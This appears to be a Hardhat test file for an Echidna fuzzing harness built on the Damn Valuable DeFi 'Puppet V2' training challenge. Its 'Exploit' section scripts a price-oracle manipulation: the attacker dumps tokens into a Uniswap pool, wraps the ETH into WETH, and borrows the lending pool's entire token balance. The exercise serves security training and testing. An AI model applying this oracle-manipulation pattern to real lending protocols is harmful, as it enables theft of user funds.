const { ethers } = require('hardhat');
const { expect, assert } = require('chai');

/**
 * @dev DO NOT FORGET TO UNCOMMENT GETTERS OUT IN THE CONTRACT
 * IF YOU WANT TO RUN THIS TEST
 */

describe('Echidna Setup', function () {
  let deployer;

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
  const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
  const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('20');

  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

  before(async function () {
    deployer = await ethers.getSigner();
    // deploy echidna
    const EchidnaPuppetV2Factory = await ethers.getContractFactory(
      'EchidnaPuppetV2',
      deployer
    );
    const totalEth = UNISWAP_INITIAL_WETH_RESERVE.add(
      ATTACKER_INITIAL_ETH_BALANCE
    );
    this.echidna = await EchidnaPuppetV2Factory.deploy({ value: totalEth });
    // get attacker contract
    const UsersFactory = await ethers.getContractFactory('Users', deployer);
    this.attacker = await UsersFactory.attach(await this.echidna.getAttacker());
    // get weth contract
    const WETH9Factory = await ethers.getContractFactory('WETH9');
    this.weth = await WETH9Factory.attach(await this.echidna.getWeth());
    // get DVT
    const TokenFactory = await ethers.getContractFactory(
      'EchidnaDamnValuableToken'
    );
    this.token = await TokenFactory.attach(await this.echidna.getToken());
    // get puppet pool
    const EchidnaPuppetV2PoolFactory = await ethers.getContractFactory(
      'EchidnaPuppetV2Pool'
    );
    this.pool = await EchidnaPuppetV2PoolFactory.attach(
      await this.echidna.getPool()
    );
    // initialize echidna -> moved to constructor of the contract
    // await this.echidna.init({ value: totalEth });
  });

  describe('Attacker', function () {
    it('check init balances', async function () {
      const attackerInitETHBalance = await ethers.provider.getBalance(
        this.attacker.address
      );
      assert.equal(
        attackerInitETHBalance.toString(),
        ATTACKER_INITIAL_ETH_BALANCE.toString()
      );
      const attackerInitTokenBalance = await this.token.balanceOf(
        this.attacker.address
      );
      assert.equal(
        attackerInitTokenBalance.toString(),
        ATTACKER_INITIAL_TOKEN_BALANCE.toString()
      );
    });

    it('deposit eth to weth', async function () {
      // test deposit to weth via proxy call
      const attackerWethBalanceBefore = await this.weth.balanceOf(
        this.attacker.address
      );
      // assert.equal(attackerWethBalanceBefore.toString(), '0');
      // deposit eth to weth
      await this.echidna.depositEthToWeth({
        value: ATTACKER_INITIAL_ETH_BALANCE,
      });
      const attackerEthBalanceAfter = await ethers.provider.getBalance(
        this.attacker.address
      );
      assert.equal(attackerEthBalanceAfter.toString(), '0');

      const attackerWethBalanceAfter = await this.weth.balanceOf(
        this.attacker.address
      );
      assert.equal(
        attackerWethBalanceAfter.toString(),
        ATTACKER_INITIAL_ETH_BALANCE.toString()
      );
    });
  });

  it('Pool', async function () {
    const poolInitTokenBalance = await this.token.balanceOf(this.pool.address);
    assert.equal(
      poolInitTokenBalance.toString(),
      POOL_INITIAL_TOKEN_BALANCE.toString()
    );
    const poolInitEthBalance = await ethers.provider.getBalance(
      this.pool.address
    );
    assert.equal(poolInitEthBalance.toString(), '0');
    const poolInitWethBalance = await this.weth.balanceOf(this.pool.address);
    assert.equal(poolInitWethBalance.toString(), '0');
  });

  it('UniSwap', async function () {
    const [initWethReserve, initTokenReserve] =
      await this.echidna.getUniswapReserves();
    assert.equal(
      initWethReserve.toString(),
      UNISWAP_INITIAL_WETH_RESERVE.toString()
    );
    assert.equal(
      initTokenReserve.toString(),
      UNISWAP_INITIAL_TOKEN_RESERVE.toString()
    );
  });

  describe('Exploit', function () {
    it('tries to init again', async function () {
      await expect(this.echidna.init()).to.be.revertedWith(
        'Already initialised'
      );
    });
    it('the exploit scenario', async function () {
      // Ensure correct setup of pool.
      expect(
        await this.pool.calculateDepositOfWETHRequired(
          ethers.utils.parseEther('1')
        )
      ).to.be.eq(ethers.utils.parseEther('0.3'));
      expect(
        await this.pool.calculateDepositOfWETHRequired(
          POOL_INITIAL_TOKEN_BALANCE
        )
      ).to.be.eq(ethers.utils.parseEther('300000'));
      // get addresses
      const attackerAddress = this.attacker.address;
      const poolAddress = this.pool.address;
      // 1: swap dvt to eth
      const attackerTokenBalanceBefore = await this.token.balanceOf(
        attackerAddress
      );
      const attackerEthBalanceBefore = await ethers.provider.getBalance(
        attackerAddress
      );
      // action
      await this.echidna.swapAllDvtForEth();
      // checks
      const attackerTokenBalanceAfter = await this.token.balanceOf(
        attackerAddress
      );
      const attackerEthBalanceAfter = await ethers.provider.getBalance(
        attackerAddress
      );
      console.log(
        'attackerEthBalanceBefore',
        ethers.utils.formatEther(attackerEthBalanceBefore.toString())
      );
      console.log(
        'attackerEthBalanceAfter',
        ethers.utils.formatEther(attackerEthBalanceAfter.toString())
      );
      // assertions
      assert.equal(attackerTokenBalanceAfter.toString(), '0');
      assert(attackerEthBalanceAfter > attackerEthBalanceBefore);
      // 2: deposit eth to weth contract
      const poolTokenBalance = await this.token.balanceOf(poolAddress);
      const wethDepositRequired =
        await this.pool.calculateDepositOfWETHRequired(poolTokenBalance);
      console.log(
        'wethDepositRequired',
        ethers.utils.formatEther(wethDepositRequired.toString())
      );
      assert(attackerEthBalanceAfter > wethDepositRequired);
      await this.echidna.depositEthToWeth({ value: attackerEthBalanceAfter });
      const attackerWethBalance = await this.weth.balanceOf(attackerAddress);
      console.log(
        'attackerWethBalance',
        ethers.utils.formatEther(attackerWethBalance.toString())
      );
      assert(attackerWethBalance >= wethDepositRequired);
      // borrow all tokens
      await this.echidna.borrowDvt();
      const poolTokenBalanceAfterAttack = await this.token.balanceOf(
        poolAddress
      );
      console.log(
        'poolTokenBalanceAfterAttack',
        ethers.utils.formatEther(poolTokenBalanceAfterAttack.toString())
      );
      assert(poolTokenBalanceAfterAttack.toString() == '0');
      // // testPoolBalance --> need to modify the function
      // const poolBalanceByEchidna = await this.echidna.testPoolBalance();
      // console.log('poolBalanceByEchidna', poolBalanceByEchidna.toString());
    });
  });
});
